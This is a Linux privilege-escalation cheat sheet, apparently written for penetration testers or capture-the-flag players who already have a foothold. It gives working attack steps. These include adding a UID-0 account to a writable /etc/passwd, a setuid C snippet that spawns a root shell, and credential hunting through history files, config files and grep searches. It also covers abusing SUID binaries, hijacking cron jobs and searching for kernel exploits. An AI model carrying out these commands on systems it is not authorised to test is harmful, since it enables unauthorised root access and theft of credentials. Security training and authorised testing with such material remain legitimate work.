# Basic Privilege Escalation And Enumeration

## Overview

This is just a few basic searches we can do when we first gain a foothold on the target system. We will first look for some quick wins and then move onto searching for interesting files in common directories, along with searches for passwords and credentials.

We can then look for some misconfigurations, we can look for cron jobs and automated tasks that might be running on the system. From there we will search for misconfigurations on files, binaries and directories. While searching for misconfigurations on binaries, we can search the binary version on things that stand out to us.

Lastly, we will take a look at kernel exploits for the kernel and Operating system version. Are there any updates that the system needs, are there any tools to compile possible Kernel exploits.

## Upgrading The Terminal

When we gain access to the target system, we can upgrade or terminal if needed. Entering the commands below is an easy way to get our terminal the way we want.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'

Ctrl + Z        <--- To background the process
stty raw -echo ; fg ; reset

export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 211; reset
```

## Searching For Quick Escalation

We can start looking for some fast ways to escalate privileges. We'll search for the current users groups, sudo privileges and take a look at to see if we can write to any interesting files.

User groups, is there anything interesting there? E.g. sudo, wheel, docker, adm, ldx.
```
id
getent group sudo
```

Lets then look to see if the current user can run any commands with elevated privileges.
```
sudo -l
```

Can we write to or read /etc/shadow, can we write to /etc/passwd, /etc/sudoers. Whats inside /etc/sudoers.d/.  

Here we can write to /etc/passwd
```
1. Create the hashed password for the /etc/passwd file.

openssl passwd -1                            # Create a $1$ Password hash
password123                                  # Password to hash
$1$mkzwx291$5mgh70N36xQQ8158lmaCk1           # The output of the hashed password

2. Enter the root user into the /etc/passwd file.

echo 'bob:$1$mkzwx291$5mgh70N36xQQ8158lmaCk1:0:0:bob:/home/bob:/bin/bash' >> /etc/passwd

3. Login to the root user.

su - bob
```

## Searching For Credentials, Passwords And Interesting Files That Might Contain Useful Information

We can start by looking inside user directories in /home. Looking for readable files that might contain interesting information. Here are a few files that we could find in our current users /home dir.
```
ls -lsaht /home/bob

cat ~/.bashrc
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

Are there any interesting configuration files that exist on the system, can we read them? Are there files that might have credentials inside. Can we find any accessible SSH directories or files?
```
find / -type d -name wordpress 2> /dev/null
find / -type f -name wp-config.php 2> /dev/null

.ssh
id_rsa
wp-config.php
httpd.conf
php.ini
my.cnf
debian.cnf      <--- Can login to mysql with username and password (E.g. debian-sys-maint:djnb9Z2FBT2ay1OM)>
```

We can also look for files owned by interesting users or groups, be that our current user or users we think could be of interest.
```
find /var -user bob
find /var -group bob
find /var/www -user bob -name "*.txt"
```

We can then start to look at other config files on the system. What can we find inside interesting directories like E.g. /etc. Let's also look inside some other interesting directories that might contain interesting information.
```
ls -lsaht /tmp/
ls -lsaht /var/home/
ls -lsaht /etc/
ls -lsaht /var/
ls -lsaht /var/mail/
ls -lsaht /var/spool
ls -lsaht /var/log
ls -lsaht /var/lib/
ls -lsaht /var/db/
ls -lsaht /var/tmp/
ls -lsaht /var/www/
ls -lsaht /opt/
```

While we are looking around the system we can start looking for strings inside files. For example, we can search for passwords, database credentials and usernames.
```
grep -rnw '/home/' -e 'password' 2> /dev/null
grep --color=auto -rnw '.' -ie "PASSWORD" --color=always 2> /dev/null
grep --color=auto -rnw '.' -ie "\$dbpass" --color=always 2> /dev/null

find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \; 2> /dev/null
find . -type f -exec grep -i -I "DB_USER" {} /dev/null \; 2> /dev/null
```

## Can We Find Any Misconfigurations

We can start by running [PSPY](https://github.com/DominicBreuker/pspy) on the target system. This will show us what commands are being run on the system by other users, E.g. cron jobs and automated scripts.

Are there any processes being executed that we can control? The following C code spawns a root shell.
```c
int main() {
    setuid(0);
    system("/bin/bash -p"):
}
```

If we find any unusual binarys, we can do some [Binary Analysis](https://opensource.com/article/20/4/linux-binary-analysis)
```
file 
idd
hexeditor
Hexdump
strings
readelf
```

We can also use ltrace and strace to see what system calls the process is making.

>ltrace: is a program that simply runs the specified command until it exits. It intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process.  It can also intercept and print the system calls executed by the program.  

>strace: In the simplest case strace runs the specified command until it exits. It intercepts and records the system calls which are called by a process and the signals which are received by a process.  The name of each system call, its arguments and its return value are printed on standard error or to the file specified with the -o option.  

Now, let us manually look at cron jobs that are being run. When we find something interesting, remember to look at the path of the cron job. Is that path writable, are files writable, are the commands in scripts using the absolute path to binaries. Can we write to, whatever the automated task is executing. What libraries are being used by the programming language and can we exploit this.
```
crontab -l
cat /etc/cron*
ls -lahR /etc/cron*
ls -l /etc/cron.d/
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
```

After our search lets take a look at possible SUDI/SGID escalation possibilities. Check things we are not too sure about. We can check [GTFOBins](https://gtfobins.github.io/) for ways to exploit misconfigurations.
```
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -perm /2000 -type f -exec ls -la {} 2>/dev/null \;
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 

# Here are some outputs. 
-rws--x--x. 1 root root 23960 Sep 23  2016 /usr/bin/chfn        <--- SUID
-r-xr-sr-x. 1 root tty 15392 May  4  2014 /usr/bin/wall         <--- SGID

# Some examples.
/usr/bin/awk
/bin/tar
/usr/bin/python
/usr/bin/script
/usr/bin/man
/usr/bin/ssh
/usr/bin/scp
/usr/bin/git
/usr/bin/find
/usr/bin/gdb
/usr/bin/pico
/usr/bin/nano
/usr/bin/zip
/usr/bin/vi
/usr/sbin/lsof
/bin/cat
/usr/bin/vim
/usr/bin/gvim
``` 

Is MYSQL login using default or weak passwords. E.g. root, toor or an empty password.
```
mysql -u root -p
```

Can we re-use any passwords or credentials found in our earlier searches.
```
su - bob
su - root
msql -u root -p
```

Let's look for some interesting files and directories that can be written to.
```
find /etc/ -writable -type d 2>/dev/null               # world-writeable folders
find /etc/ -writable -type f 2>/dev/null               # world-writeable files

# Also readable
find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
find /etc/ -readable -type f 2> /dev/null | grep -i '.conf' --color=auto
```

## Services Running as root

Let's now take a look at what is running as root. Once we find something interesting or unusually, we can check the version (Check for exploits, Google, exploit-db, searchsploit)
```
ps aux | grep "^root"
ps -ef
pstree | head -n 5
systemctl status

# Check the version.
program --version
program -v

# Debian
dpkg -l | grep "name"

# rerpm systemes
rpm -aq | grep "name"
```

Let's check for services running on localhost. If exploits cannot be run on the target system, port forwarding from our Kali machine might be an option. Check the service version for exploits.
```
netstat -plantu
cat /etc/services
pstree | head -n 5

service --status-all    # Whats running

+ : means that the service is running;
– : means that the service is not running at all;
? : means that Ubuntu was not able to tell if the service is running or not
```

## Kernel Exploits

Lets get some Kernel information on the target system. 
```
uname -a
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null
lscpu     # Architecture
```

After we note the Kerenl information, we can get the OS information.
```
cat /etc/*-release
```

We can search Google, exploit-db and searchsploit for known exploits in regards to Kerenl and OS versions of the system.
```
searchsploit linux 4.4.0 kernel local Privilege Escalation
searchsploit local kernel 2.6. centos
searchsploit -t CentOS 4.
```

We can use some of searchsploits switches to tailor the search.
```
-c, --case  Perform a case-sensitive search (Default is inSEnsITiVe)
-e, --exact Perform an EXACT & order match on exploit title
-s, --strict Perform a strict search, so input values must exist
-t, --title Search JUST the exploit title
--exclude="term" Remove values from results. By using "|" to separate, you can chain multiple values
```

Once we have an exploit that looks interesting, we can examine and download with the following switches.
```
-m, --mirror   [EDB-ID]    Mirror (aka copies) an exploit to the current working directory
-x, --examine  [EDB-ID]    Examine (aka opens) the exploit using $PAGER
```
